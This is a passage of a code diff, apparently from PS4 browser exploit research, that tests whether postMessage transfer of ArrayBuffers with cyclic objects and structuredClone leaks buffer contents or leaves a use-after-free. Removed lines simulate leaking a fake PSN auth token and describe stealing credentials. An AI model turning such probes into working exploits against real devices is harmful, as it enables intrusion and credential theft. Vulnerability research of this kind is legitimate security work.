-  // Conteúdo simulado: header + dados estruturados
-  pvt32[0] = 0x50534E45; // PSNE (PlayStation Network key header)
-  pvt32[1] = 0x594B4559; // YKEY
-  pvt32[2] = 0x00000001; // version 1
-  pvt32[3] = 0x00000040; // length 64
-  for(var i=4;i<20;i++) pvt32[i] = (0x41000000 + i * 0x01010101) >>> 0; // fake key data
+  // Passo 1: structuredClone
+  var cloned = null;
+  try {
+    cloned = structuredClone(cyclic);
+    info('structuredClone OK.');
+    info('cloned.arr.buffer === buf: ' + (cloned.arr && cloned.arr.buffer === buf));
+    info('cloned.buf === buf: ' + (cloned.buf === buf));
+    info('cloned.arr[0]: 0x' + (cloned.arr ? cloned.arr[0].toString(16) : 'N/A'));
+  } catch(e) {
+    info('structuredClone lançou: ' + e.message);
+    cloned = null;
+  }
 
-  // Criar estrutura de dados que referencia o buffer privado
-  var dataObj = {
-    header: 'PSN_AUTH_TOKEN',
-    token_buf: privateBuf,    // ← buffer que queremos vazar
-    expiry: Date.now() + 3600000,
-    self: null
-  };
-  dataObj.self = dataObj; // ciclo
-
-  info('privateBuf criado: pvt32[0]=0x' + pvt32[0].toString(16) + ' (PSNE header)');
-  info('privateBuf.byteLength=' + privateBuf.byteLength);
-  info('Objeto cíclico criado com referência ao buffer privado.\n');
-
+  // Passo 2: postMessage com transfer
   window.onmessage = function(e) {
     var obj = e.data;
-    if(!obj || !obj.header) return;
-    info('[RECEPTOR] Recebeu objeto: header=' + obj.header);
-    if(obj.token_buf instanceof ArrayBuffer) {
-      info('[RECEPTOR] token_buf.byteLength=' + obj.token_buf.byteLength);
-      if(obj.token_buf.byteLength > 0) {
-        var rv = new Uint32Array(obj.token_buf);
-        var header = '0x' + rv[0].toString(16);
-        var version = rv[2];
-        var keyData = [];
-        for(var i=4;i<8;i++) keyData.push('0x'+rv[i].toString(16));
-
-        alerta('ARBITRARY READ via BUFFER LEAK!\n' +
-               'Receptor obteve acesso ao privateBuf:\n' +
-               '  Header: ' + header + ' (' + String.fromCharCode(
-                 rv[0]>>>24, (rv[0]>>>16)&0xFF, (rv[0]>>>8)&0xFF, rv[0]&0xFF
-               ) + ')\n' +
-               '  Version: ' + version + '\n' +
-               '  Key data: [' + keyData.join(', ') + ']\n\n' +
-               'O remetente tentou usar transfer para proteger o buffer,\n' +
-               'mas o motor PS4 copiou os dados para o receptor.\n\n' +
-               'IMPACTO REAL: qualquer página web maliciosa rodando no PS4\n' +
-               'pode vazar ArrayBuffers contendo tokens de auth, chaves de sessão,\n' +
-               'dados de save game, credenciais de rede, etc.\n' +
-               'desde que o código vulnerável use postMessage com objetos cíclicos.');
-      }
+    if(!obj || obj.id !== 'clone_transfer_test') return;
+    info('[onmessage] Recebeu obj.id=' + obj.id);
+    if(obj.buf instanceof ArrayBuffer) {
+      info('[onmessage] obj.buf.byteLength=' + obj.buf.byteLength);
+      var rv = new Uint32Array(obj.buf);
+      info('[onmessage] obj.buf[0]=0x' + rv[0].toString(16));
     }
   };
 
-  info('Enviando postMessage com privateBuf no objeto cíclico...');
   try {
-    postMessage(dataObj, '*', [privateBuf]);
-    info('Enviado. privateBuf.byteLength após transfer: ' + privateBuf.byteLength);
-    if(privateBuf.byteLength === 0) {
-      info('Remetente: buffer "protegido" (byteLength=0).');
-      info('Aguardando receptor para confirmar leak...');
+    postMessage(cyclic, '*', [buf]);
+    info('\nTransfer executado. buf.byteLength=' + buf.byteLength);
+    info('u32.buffer.byteLength=' + u32.buffer.byteLength);
+
+    if(cloned && cloned.arr) {
+      info('\nVerificando cloneA após transfer do original:');
+      info('cloned.arr.buffer.byteLength: ' + cloned.arr.buffer.byteLength);
+      try {
+        var v = cloned.arr[0];
+        info('cloned.arr[0]: 0x' + (v !== undefined ? v.toString(16) : 'undefined'));
+        if(v === undefined && buf.byteLength === 0) {
+          alerta('CLONE COMPARTILHAVA O BUFFER TRANSFERIDO!\n' +
+                 'Após transfer de buf, cloned.arr[0] = undefined\n' +
+                 '(buffer do clone foi zerado junto com o original)\n' +
+                 'Isso confirma que o clone e o original compartilhavam o mesmo ArrayBuffer!');
+        } else if(v !== undefined && buf.byteLength === 0) {
+          info('Clone ainda tem acesso após transfer do original.');
+          info('buf zerado mas cloned.arr[0]=0x' + v.toString(16) + ' (backing store independente)');
+        }
+      } catch(ex) {
+        alerta('EXCECAO ao acessar cloned.arr[0] após transfer: ' + ex.message + '\n' +
+               'O clone não consegue mais acessar seu buffer!');
+      }
+    }
+
+    // Passo 3: verificar se podemos criar um TypedArray apontando para o buf zerado
+    info('\nTentando criar nova view sobre buf transferido...');
+    try {
+      var zombieView = new Uint32Array(buf); // buf.byteLength=0
+      info('Uint32Array(buf) criado: length=' + zombieView.length);
+      if(zombieView.length === 0) {
+        info('zombieView.length=0 (buffer zerado — expected)');
+      }
+    } catch(ex) {
+      info('new Uint32Array(buf) lançou: ' + ex.message);
+    }
+
+    // Verificar estado do cloned após todos os testes
+    if(cloned) {
+      info('\nEstado final do clone:');
+      info('cloned.self === cloned: ' + (cloned.self === cloned));
+      info('cloned.arr: ' + (cloned.arr ? 'exists len='+cloned.arr.length : 'null'));
+      if(cloned.arr && cloned.arr.buffer) {
+        info('cloned.arr.buffer.byteLength: ' + cloned.arr.buffer.byteLength);
+        if(cloned.arr.buffer.byteLength === 0) {
+          alerta('CLONE.ARR.BUFFER FOI ZERADO!\n' +
+                 'O buffer do TypedArray no clone tem byteLength=0 após o transfer.\n' +
+                 'O clone e o original compartilhavam o ArrayBuffer. UAF potencial!');
+        }
+      }
     }
   } catch(e) {
     ok('postMessage lançou: ' + e.message);
